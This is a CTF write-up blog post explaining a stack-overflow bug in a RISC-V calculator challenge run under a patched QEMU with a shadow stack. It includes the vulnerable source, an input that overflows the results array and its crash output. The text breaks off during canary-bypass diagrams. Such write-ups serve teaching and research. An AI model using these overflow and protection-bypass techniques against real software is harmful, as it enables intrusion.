<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content="Thalium Team"><meta name=description content="Thalium blog."><meta name=keywords content="blog,tech"><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.120.4"><link rel=canonical href=/posts/ecw-2023-the-calculator-in-shadow-write-up/><meta property="og:title" content="ECW 2023: The Calculator in Shadow (write-up)"><meta property="og:description" content="The Calculator in Shadow was a hard pwn challenge created for the European Cyber Week CTF 2023 qualifiers. It included exploiting a RISC-V calculator running on top of a customized QEMU that featured a poorly implemented shadow stack."><meta property="og:type" content="article"><meta property="og:url" content="/posts/ecw-2023-the-calculator-in-shadow-write-up/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-11-07T12:00:00+01:00"><meta property="article:modified_time" content="2023-11-07T12:00:00+01:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="ECW 2023: The Calculator in Shadow (write-up)"><meta name=twitter:description content="The Calculator in Shadow was a hard pwn challenge created for the European Cyber Week CTF 2023 qualifiers. It included exploiting a RISC-V calculator running on top of a customized QEMU that featured a poorly implemented shadow stack."><meta itemprop=name content="ECW 2023: The Calculator in Shadow (write-up)"><meta itemprop=description content="The Calculator in Shadow was a hard pwn challenge created for the European Cyber Week CTF 2023 qualifiers. It included exploiting a RISC-V calculator running on top of a customized QEMU that featured a poorly implemented shadow stack."><meta itemprop=datePublished content="2023-11-07T12:00:00+01:00"><meta itemprop=dateModified content="2023-11-07T12:00:00+01:00"><meta itemprop=wordCount content="8014"><meta itemprop=keywords content="CTF,Writeup,ECW 2023,Exploit,QEMU,RISCV,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=icon href=/favicon.ico><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-141692648-1","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><title>ECW 2023: The Calculator in Shadow (write-up)
</title><script>MathJax={tex:{inlineMath:[["∳","∳"]],displayMath:[["∳∳","∳∳"]],processEscapes:!0},svg:{fontCache:"global"}}</script><script type=text/javascript id=MathJax-script async src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js></script></head><body><style>@font-face{font-family:days_one;src:url(/days_one.ttf)format('truetype')}.siteTitle{margin-top:24px}.siteTitle img{display:inline-block;vertical-align:middle;margin-top:-24px;margin-right:-10px}.siteTitle span{font-family:days_one,Fallback,sans-serif;color:#fff;font-size:160%}</style><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=/><img src=/shard_only_no_background.png width=12%></img>
<span>THALIUM</span></a></div><a class=nav-item href=/posts/><div class=nav-item-title>Posts</div></a><a class=nav-item href=/joinus/><div class=nav-item-title>Join Us</div></a><a class=nav-item href=/about/><div class=nav-item-title>About</div></a></nav><div class=social-links-header><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>Github</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div></div></header><article class=post><h1 class=title>ECW 2023: The Calculator in Shadow (write-up)</h1><div class=content><p>This year again, Thalium took part in organizing the <a href=https://www.european-cyber-week.eu/>European Cyber Week</a> CTF qualifiers, as well as designing several challenges in our core competencies.</p><p>For this occasion, I came up with a hard pwn challenge titled <strong>The Calculator in Shadow</strong>.</p><p>It focused on the low-level exploitation of a RISC-V program using a stack overflow vulnerability, but with a twist: the program was run on top of a customized QEMU user-mode emulator, which added a poorly implemented shadow stack protection.</p><p>Only 5 participants managed to solve it. In this write-up I will describe the challenge from my point of view as the author.</p><h1 id=introduction>Introduction</h1><p>The challenge&rsquo;s description was the following:</p><p><a href=/posts/img/ecw-2023/the-calculator-in-shadow/challenge.png target=_blank><img src=/posts/img/ecw-2023/the-calculator-in-shadow/challenge.png alt="Challenge description"></a></p><p>The players were also given:</p><ul><li>the QEMU patch;</li><li>the calculator source code;</li><li>a tiny Binutils patch to be able to compile the new instructions;</li><li>a RISC-V sysroot;</li><li>a docker with all build and debug tools already setup.</li></ul><p>You can retrieve all these files <a href=/posts/binaries/ecw-2023/the-calculator-in-shadow/The-Calculator-in-Shadow.zip>here</a>.</p><p>Now for the solution, the players were expected to:</p><ol><li>Understand that the QEMU patch is implementing a shadow stack, since they weren&rsquo;t explicitly aware of it, despite the small hint in the title and introduction.</li><li>Find a buffer overflow vulnerability in the calculator and exploit it.</li><li>Bypass the shadow stack.</li><li>Enjoy flagging.</li></ol><p>If you&rsquo;re not familiar with RISC-V, you can get a quick glance of it through <a href=https://github.com/jameslzhu/riscv-card/blob/master/riscv-card.pdf>this RISC-V card</a>.</p><h1 id=the-calculators-vulnerability>The calculator&rsquo;s vulnerability</h1><p>A Makefile was made available with the calculator&rsquo;s source. In particular, one could use the command <code>make sunbath</code> to recompile everything <em>without</em> the shadow stack custom instructions.</p><p>The calculator was a small program that I implemented with this architecture:</p><ul><li><code>main.c</code> asks for an input amounting to a maximum of 127 bytes.</li><li>The input then undergoes lexical and syntactic analysis through <a href=https://github.com/westes/flex>flex</a> and <a href=https://www.gnu.org/software/bison>bison</a>, resulting in an <a href=https://en.wikipedia.org/wiki/Abstract_syntax_tree>AST</a>. The tokens were described in the file <code>ast.l</code> and the grammar in <code>ast.y</code>.</li><li>At this point it is possible to dump the AST for debugging purposes if the calculator was launched with the <code>-d</code> option. The logic for this lies in <code>debug.c</code>.</li><li>The functions in <code>calc.c</code> handle traveling throughout the AST and computing the calculation along the way.</li><li>Finally, the result is printed, and the program terminates.</li></ul><p>The AST is composed of two types of nodes:</p><ul><li>Number nodes which are the leaf nodes of the tree. During the parsing, these nodes are given a <code>value</code>.</li><li>Binary operations node which have 2 children. The supported operations are the arithmetic addition, subtraction, multiplication, division, and the power function. During the parsing, these nodes are given an <code>id</code> in the order they are created. Due to this process, a node with precedence over another will have a lower <code>id</code>.</li></ul><p>This organization is illustrated by this simple AST:</p><pre tabindex=0><code>$ calculator -d
&gt;&gt; 1*(2+3)

| kind = NODE_TIMES
| id = 1
| 
| left:
| 
|  | kind = NODE_NUMBER
|  | value = 1
| 
| right:
| 
|  | kind = NODE_PLUS
|  | id = 0
|  | 
|  | left:
|  | 
|  |  | kind = NODE_NUMBER
|  |  | value = 2
|  | 
|  | right:
|  | 
|  |  | kind = NODE_NUMBER
|  |  | value = 3
|  | 
| 

Result: 5
</code></pre><p>The stack overflow vulnerability is present during the calculation process so let&rsquo;s take a closer look to the core of the calculation phase:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// in file calc.c
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>error_kind <span style=color:#a6e22e>calc</span> (<span style=color:#66d9ef>node_t</span><span style=color:#f92672>*</span> node_root, <span style=color:#66d9ef>int64_t</span><span style=color:#f92672>*</span> result) {
</span></span><span style=display:flex><span>  IN_SHADOW
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int64_t</span> results[MAX_OPS];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>bool</span> completed[MAX_OPS];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memzero</span>(results, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>int64_t</span>) <span style=color:#f92672>*</span> MAX_OPS);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memzero</span>(completed, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>bool</span>) <span style=color:#f92672>*</span> MAX_OPS);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (node_root<span style=color:#f92672>-&gt;</span>kind <span style=color:#f92672>==</span> NODE_NUMBER) {
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>result <span style=color:#f92672>=</span> node_root<span style=color:#f92672>-&gt;</span>content.value;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ERROR_NO_ERROR;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  error_kind err <span style=color:#f92672>=</span> <span style=color:#a6e22e>dispatch</span>(node_root, results, completed);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (err <span style=color:#f92672>!=</span> ERROR_NO_ERROR) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> err;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>*</span>result <span style=color:#f92672>=</span> results[node_root<span style=color:#f92672>-&gt;</span>content.binop.id];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> ERROR_NO_ERROR;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Here the <code>dispatch</code> function will scan the AST recursively, starting from the root node, with a depth-first approach. Each binary operation node encountered along the way will have its result stored in the <code>results</code> array indexed by the node&rsquo;s <code>id</code>. The result will then be used to compute upper nodes. To keep tracks of the already computed nodes the <code>completed</code> array is used.</p><p>Since <code>MAX_OPS</code> is a constant fixed to 16 we can overflow the arrays by performing a calculation that holds more than 16 operations.</p><p>However, it is not so easy to do so, since the <code>secure_calc</code> function that is responsible for calling <code>calc</code> performs a few checks beforehand:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>error_kind <span style=color:#a6e22e>secure_calc</span> (<span style=color:#66d9ef>char</span> input[], <span style=color:#66d9ef>node_t</span><span style=color:#f92672>*</span> node_root, <span style=color:#66d9ef>int64_t</span><span style=color:#f92672>*</span> result) {
</span></span><span style=display:flex><span>  IN_SHADOW
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (MAX_OPS <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>count_ops</span>(input)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> ERROR_OPS_LIMIT;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>calc</span>(node_root, result);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>uint8_t</span> <span style=color:#a6e22e>count_ops</span> (<span style=color:#66d9ef>char</span> input[]) {
</span></span><span style=display:flex><span>  IN_SHADOW
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint8_t</span> count <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint8_t</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> c;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>do</span> {
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> input[i<span style=color:#f92672>++</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;+&#39;</span> <span style=color:#f92672>||</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;-&#39;</span> <span style=color:#f92672>||</span> c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/&#39;</span>) {
</span></span><span style=display:flex><span>      count<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (c <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;*&#39;</span>) {
</span></span><span style=display:flex><span>      count<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (input[i] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;*&#39;</span>) {
</span></span><span style=display:flex><span>        i<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>while</span> (c <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;\0&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> count;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We succeed if we can make <code>count_ops</code> return a wrong result. A way could be to overflow the <code>count</code> variable which is only an <code>uint8_t</code>. However, in our case this approach is a bit of a bait since the input collected by <code>main</code> cannot exceed 127 bytes.</p><p>The real flaw of this function lies in the way it counts the operations: parentheses are not considered. Yet, implicit multiplication, in the form <code>(a)(b)</code> is allowed by the grammar in <code>ast.y</code>:</p><pre tabindex=0><code>purefactor  : LPARENTHESIS expression RPARENTHESIS            { $$ = $2; }
            | LPARENTHESIS expression RPARENTHESIS purefactor { $$ = node_new(NODE_TIMES, $2, $4); }
            ;
</code></pre><p>To test the vulnerability let&rsquo;s write 17 <code>(1)</code> together to form 16 <code>(1)(1)</code> implicit multiplications:</p><pre tabindex=0><code>&gt;&gt; (1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)

*** stack smashing detected ***: terminated
Aborted (core dumped)
</code></pre><p>We overflow the <code>results</code> array by a single <code>int64_t</code>: this directly overwrites the stack canary.</p><p>Actually, the vulnerability could be hinted at due to rather contrived patterns of code in the calculator:</p><ul><li>results could have been stored directly in the AST instead of an array;</li><li><code>count_ops</code> could have scanned the AST to count directly the nodes;</li><li><code>count_ops</code> is not even necessary if we use the counting done during the AST building process.</li></ul><h2 id=bypassing-the-canary>Bypassing the canary</h2><p>Since we&rsquo;re using QEMU user-mode emulation, ASLR is disabled. Other standard binary protections have also been kept low:</p><pre tabindex=0><code>Arch:     riscv64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x10000)
</code></pre><p>Since NX is enabled, we want to use ROP, and the stack canary is the main barrier preventing us from doing so.</p><p>Or goal is to overwrite the return address of <code>calc</code> without modifying the canary. The stack frame of this function is organized in the following manner:</p><div class="goat svg-container"><svg xmlns="http://www.w3.org/2000/svg" font-family="Menlo,Lucida Console,monospace" viewBox="0 0 680 345"><g transform="translate(8,16)"><path d="M168 40H504" fill="none" stroke="currentcolor"/><path d="M168 88H504" fill="none" stroke="currentcolor"/><path d="M168 136H504" fill="none" stroke="currentcolor"/><path d="M168 184H504" fill="none" stroke="currentcolor"/><path d="M168 232H504" fill="none" stroke="currentcolor"/><path d="M168 280H504" fill="none" stroke="currentcolor"/><path d="M144 0V304" fill="none" stroke="currentcolor"/><path d="M168 0V320" fill="none" stroke="currentcolor"/><path d="M504 0V320" fill="none" stroke="currentcolor"/><polygon points="152.000000,304.000000 140.000000,298.399994 140.000000,309.600006" fill="currentcolor" transform="rotate(90.000000, 144.000000, 304.000000)"/><text text-anchor="middle" x="184" y="20" fill="currentcolor" style="font-size:1em">L</text><text text-anchor="middle" x="184" y="68" fill="currentcolor" style="font-size:1em">F</text><text text-anchor="middle" x="184" y="116" fill="currentcolor" style="font-size:1em">L</text><text text-anchor="middle" x="184" y="164" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="184" y="212" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="184" y="260" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="184" y="308" fill="currentcolor" style="font-size:1em">H</text><text text-anchor="middle" x="192" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="192" y="68" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="192" y="116" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="192" y="164" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="192" y="212" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="192" y="260" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="192" y="308" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="200" y="20" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="200" y="68" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="200" y="116" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="200" y="164" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="200" y="212" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="200" y="260" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="200" y="308" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="208" y="20" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="208" y="68" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="208" y="116" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="208" y="164" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="208" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="208" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="208" y="308" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="216" y="20" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="216" y="68" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="216" y="116" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="216" y="164" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="216" y="212" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="216" y="260" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="216" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="224" y="68" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="224" y="308" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="232" y="20" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="232" y="68" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="232" y="116" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="232" y="164" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="232" y="212" fill="currentcolor" style="font-size:1em">F</text><text text-anchor="middle" x="232" y="260" fill="currentcolor" style="font-size:1em">R</text><text text-anchor="middle" x="240" y="20" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="240" y="68" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="240" y="116" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="240" y="164" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="240" y="212" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="240" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="240" y="308" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="248" y="20" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="248" y="116" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="248" y="164" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="248" y="212" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="248" y="260" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="248" y="308" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="256" y="20" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="256" y="68" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="256" y="116" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="256" y="164" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="256" y="212" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="256" y="260" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="256" y="308" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="264" y="20" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="264" y="68" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="264" y="116" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="264" y="164" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="264" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="264" y="260" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="264" y="308" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="272" y="20" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="272" y="68" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="272" y="116" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="272" y="164" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="272" y="260" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="272" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="280" y="20" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="280" y="68" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="280" y="116" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="280" y="212" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="280" y="308" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="288" y="20" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="288" y="68" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="288" y="116" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="288" y="212" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="288" y="260" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="288" y="308" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="296" y="20" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="296" y="68" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="296" y="116" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="296" y="212" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="296" y="260" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="296" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="304" y="68" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="304" y="212" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="304" y="260" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="304" y="308" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="312" y="20" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="312" y="68" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="312" y="212" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="312" y="260" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="320" y="20" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="320" y="68" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="320" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="320" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="320" y="308" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="328" y="20" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="328" y="212" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="328" y="260" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="328" y="308" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="336" y="20" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="336" y="68" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="336" y="260" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="336" y="308" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="344" y="20" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="344" y="68" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="344" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="352" y="20" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="352" y="68" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="352" y="308" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="360" y="68" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="360" y="308" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="368" y="20" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="368" y="68" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="368" y="308" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="376" y="20" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="376" y="68" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="376" y="308" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="384" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="384" y="308" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="392" y="20" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="392" y="68" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="400" y="20" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="400" y="68" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="400" y="308" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="408" y="308" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="416" y="20" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="416" y="68" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="416" y="308" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="424" y="20" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="424" y="68" fill="currentcolor" style="font-size:1em">h</text><text text-anchor="middle" x="424" y="308" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="432" y="20" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="432" y="68" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="432" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="440" y="20" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="440" y="308" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="448" y="20" fill="currentcolor" style="font-size:1em">w</text><text text-anchor="middle" x="448" y="68" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="448" y="308" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="456" y="20" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="456" y="68" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="464" y="20" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="464" y="68" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="472" y="20" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="472" y="68" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="480" y="20" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="480" y="68" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="488" y="20" fill="currentcolor" style="font-size:1em">)</text></g></svg></div><p>Here is what the stack looks like in more details for a legitimate calculation <code>(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)</code> which fills the result array with ones, towards the end of the function before it returns so that both the <code>results</code> and <code>completed</code> array are filled:</p><div class="goat svg-container"><svg xmlns="http://www.w3.org/2000/svg" font-family="Menlo,Lucida Console,monospace" viewBox="0 0 1080 681"><g transform="translate(8,16)"><path d="M104 40H272" fill="none" stroke="currentcolor"/><path d="M104 88H272" fill="none" stroke="currentcolor"/><path d="M104 136H272" fill="none" stroke="currentcolor"/><path d="M104 184H272" fill="none" stroke="currentcolor"/><path d="M608 184H832" fill="none" stroke="currentcolor"/><path d="M832 184h224" fill="none" stroke="currentcolor"/><path d="M104 232H272" fill="none" stroke="currentcolor"/><path d="M608 232h56" fill="none" stroke="currentcolor"/><path d="M664 232h56" fill="none" stroke="currentcolor"/><path d="M720 232h56" fill="none" stroke="currentcolor"/><path d="M776 232h56" fill="none" stroke="currentcolor"/><path d="M832 232h56" fill="none" stroke="currentcolor"/><path d="M888 232h56" fill="none" stroke="currentcolor"/><path d="M944 232h56" fill="none" stroke="currentcolor"/><path d="M1e3 232h56" fill="none" stroke="currentcolor"/><path d="M104 280H272" fill="none" stroke="currentcolor"/><path d="M608 280h56" fill="none" stroke="currentcolor"/><path d="M664 280h56" fill="none" stroke="currentcolor"/><path d="M720 280h56" fill="none" stroke="currentcolor"/><path d="M776 280h56" fill="none" stroke="currentcolor"/><path d="M832 280h56" fill="none" stroke="currentcolor"/><path d="M888 280h56" fill="none" stroke="currentcolor"/><path d="M944 280h56" fill="none" stroke="currentcolor"/><path d="M1e3 280h56" fill="none" stroke="currentcolor"/><path d="M104 328H272" fill="none" stroke="currentcolor"/><path d="M104 376H272" fill="none" stroke="currentcolor"/><path d="M104 424H272" 